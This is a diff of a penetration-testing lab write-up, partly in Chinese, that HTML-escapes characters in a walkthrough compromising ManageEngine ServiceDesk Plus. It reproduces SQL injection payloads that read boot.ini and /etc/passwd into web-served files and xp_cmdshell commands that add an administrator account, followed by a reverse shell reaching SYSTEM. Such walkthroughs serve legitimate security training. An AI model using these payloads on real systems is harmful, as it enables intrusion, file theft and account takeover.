@@ -50,8 +50,8 @@ http://192.168.244.43:8080/ [200 OK] Apache, Cookies[JSESSIONID], Country[RESERV
  Exploit Title                                                     |  Path
 ------------------------------------------------------------------- ---------------------------------
 ManageEngine ServiceDesk Plus 7.6 - woID SQL Injection             | jsp/webapps/11793.txt
-Zoho ManageEngine ServiceDesk Plus (SDP) < 10.0 build 10012 - Arbi | jsp/webapps/46413.txt
-Zoho ManageEngine ServiceDesk Plus < 10.5 - Improper Access Restri | multiple/webapps/46894.txt
+Zoho ManageEngine ServiceDesk Plus (SDP) &lt; 10.0 build 10012 - Arbi | jsp/webapps/46413.txt
+Zoho ManageEngine ServiceDesk Plus &lt; 10.5 - Improper Access Restri | multiple/webapps/46894.txt
 ------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 Papers: No Results
@@ -63,25 +63,25 @@ Papers: No Results
 Vulnerability Description:
 A Vulnerability has been discovered in Manage Engine Service Desk Plus, which can be exploited by
 malicious people to conduct SQL injection attacks.
-Input passed via the "woID" parameter to WorkOrder.do is not properly sanitized before being used in
+Input passed via the &#34;woID&#34; parameter to WorkOrder.do is not properly sanitized before being used in
 a SQL query. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
 The vulnerability is confirmed in version 7.6. Other versions may also be affected.
 
 
 Proof of Concept:
 Microsoft Windows Environment with MySQL:
-http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=6)
-union select 1,2,3,4,5,6,7,8,load_file("c:\\boot.ini"),10,11,12,13,14,15,16,17,18,19,1 into dumpfile 'C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\boot.ini'/*
+http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO&amp;woID=WorkOrder.WORKORDERID=6)
+union select 1,2,3,4,5,6,7,8,load_file(&#34;c:\\boot.ini&#34;),10,11,12,13,14,15,16,17,18,19,1 into dumpfile &#39;C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\boot.ini&#39;/*
 then browse, http://x.x.x.x:8080/images/boot.ini
 
 Microsoft Windows Environment with MSSQL:
-http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO&woID=1); EXEC xp_cmdshell 'net user
-moebius m03biu5inj3ct$ /add';--
-http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO&woID=1); EXEC xp_cmdshell 'net localgroup
-administrators moebius /add';--
+http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO&amp;woID=1); EXEC xp_cmdshell &#39;net user
+moebius m03biu5inj3ct$ /add&#39;;--
+http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO&amp;woID=1); EXEC xp_cmdshell &#39;net localgroup
+administrators moebius /add&#39;;--
 
 GNU/Linux with MySQL:
-http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO&woID=1%29%20union%20select%201,2,3,4,5,
+http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO&amp;woID=1%29%20union%20select%201,2,3,4,5,
 6,7,8,load_file%28%27/etc/passwd%27%29,10,11,12,13,14,15,16,17,18,19,20%20into%20dumpfile%
 20%27/home/moebius/ManageEngine/ServiceDesk/applications/extracted/AdventNetServiceDesk.eear
 /AdventNetServiceDeskWC.ear/AdventNetServiceDesk.war/images/passwd.txt%27/*
@@ -97,13 +97,13 @@ Google搜索默认密码，发现是`administrator\administrator`，使用这个
 我先拿的mssql的POC进行测试，爆出了SQL错误，提示是MySQL数据库：
 
 ```Java
-javax.servlet.ServletException: java.sql.SQLException: Syntax error or access violation,  message from server: &quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '; EXEC xp_cmdshell 'net user moebius m03biu5inj3ct$ /add';--)' at line 1&quot;
+javax.servlet.ServletException: java.sql.SQLException: Syntax error or access violation,  message from server: &amp;quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;; EXEC xp_cmdshell &#39;net user moebius m03biu5inj3ct$ /add&#39;;--)&#39; at line 1&amp;quot;
 ```
 
 
 
 ```http
-GET /WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID%3d6)union+select+1,2,3,4,5,6,7,8,load_file("c%3a\\boot.ini"),10,11,12,13,14,15,16,17,18,19,1+into+dumpfile+'C%3a\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\boot.ini'/* HTTP/1.1
+GET /WorkOrder.do?woMode=viewWO&amp;woID=WorkOrder.WORKORDERID%3d6)union&#43;select&#43;1,2,3,4,5,6,7,8,load_file(&#34;c%3a\\boot.ini&#34;),10,11,12,13,14,15,16,17,18,19,1&#43;into&#43;dumpfile&#43;&#39;C%3a\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\boot.ini&#39;/* HTTP/1.1
 Host: 192.168.244.43:8080
 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
 Accept: */*
@@ -147,11 +147,11 @@ connect to [192.168.45.232] from (UNKNOWN) [192.168.244.43] 49196
 Microsoft Windows [Version 6.0.6001]
 Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
 
-C:\ManageEngine\ServiceDesk\bin>whoami
+C:\ManageEngine\ServiceDesk\bin&gt;whoami
 whoami
 nt authority\system
 
-C:\Users>type administrator\desktop\proof.txt
+C:\Users&gt;type administrator\desktop\proof.txt
 type administrator\desktop\proof.txt
 362343a6e1593e22b5f3a58cdef9f423
 ```
